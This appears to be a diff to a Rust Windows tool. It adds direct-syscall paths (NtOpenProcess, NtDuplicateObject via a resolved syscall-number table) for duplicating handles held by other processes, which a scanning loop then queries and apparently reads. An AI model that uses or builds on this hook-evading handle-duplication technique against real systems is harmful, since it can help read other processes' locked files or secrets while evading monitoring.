@@ -448,6 +448,69 @@ unsafe fn read_all(api: &Api, handle: *mut c_void) -> Option<Vec<u8>> {
     Some(out)
 }
 
+/// Open another process for handle duplication: NtOpenProcess when the SSN
+/// table resolved, kernel32 OpenProcess otherwise. Handles from either are
+/// interchangeable downstream.
+unsafe fn open_process_for_dup(api: &Api, pid: u32) -> Option<*mut c_void> {
+    if let Some(nt) = crate::syscall::nt_ops() {
+        let cid = crate::syscall::ClientId {
+            unique_process: pid as usize,
+            unique_thread: 0,
+        };
+        let oa = crate::syscall::ObjectAttributes::new(std::ptr::null());
+        let mut h = 0usize;
+        if nt.open_process(&mut h, PROCESS_DUP_HANDLE, &oa, &cid) < 0 || h == 0 {
+            return None;
+        }
+        return Some(h as *mut c_void);
+    }
+    let h = (api.open_process)(PROCESS_DUP_HANDLE, 0, pid);
+    if h.is_null() {
+        None
+    } else {
+        Some(h)
+    }
+}
+
+/// Duplicate a handle from `src_proc` into this process: NtDuplicateObject
+/// when the SSN table resolved, kernel32 DuplicateHandle otherwise.
+unsafe fn duplicate_for_read(
+    api: &Api,
+    src_proc: *mut c_void,
+    src_handle: u16,
+) -> Option<*mut c_void> {
+    if let Some(nt) = crate::syscall::nt_ops() {
+        let mut target = 0usize;
+        let status = nt.duplicate_object(
+            src_proc as usize,
+            src_handle as usize,
+            usize::MAX, // current-process pseudo handle
+            &mut target,
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS,
+        );
+        if status < 0 || target == 0 {
+            return None;
+        }
+        return Some(target as *mut c_void);
+    }
+    let mut dup: *mut c_void = std::ptr::null_mut();
+    if (api.dup_handle)(
+        src_proc,
+        src_handle as *mut c_void,
+        CURRENT_PROCESS,
+        &mut dup,
+        0,
+        0,
+        DUPLICATE_SAME_ACCESS,
+    ) == 0
+    {
+        return None;
+    }
+    Some(dup)
+}
+
 unsafe fn scan_handles(
     api: &Api,
     buf: &[u8],
@@ -477,30 +540,16 @@ unsafe fn scan_handles(
         if pid == own_pid || pid == 0 || pid == 4 || entry.handle_value == 0 {
             continue;
         }
-        let src_proc = match cache.entry(pid).or_insert_with(|| {
-            let h = (api.open_process)(PROCESS_DUP_HANDLE, 0, pid);
-            if h.is_null() {
-                None
-            } else {
-                Some(h)
-            }
-        }) {
+        let src_proc = match cache
+            .entry(pid)
+            .or_insert_with(|| open_process_for_dup(api, pid))
+        {
             Some(h) => *h,
             None => continue,
         };
-        let mut dup: *mut c_void = std::ptr::null_mut();
-        if (api.dup_handle)(
-            src_proc,
-            entry.handle_value as *mut c_void,
-            CURRENT_PROCESS,
-            &mut dup,
-            0,
-            0,
-            DUPLICATE_SAME_ACCESS,
-        ) == 0
-        {
+        let Some(dup) = duplicate_for_read(api, src_proc, entry.handle_value) else {
             continue;
-        }
+        };
         let query_timeout =
             remaining.min(std::time::Duration::from_millis(QUERY_TIMEOUT_MS));
         match querier.query(dup, query_timeout) {
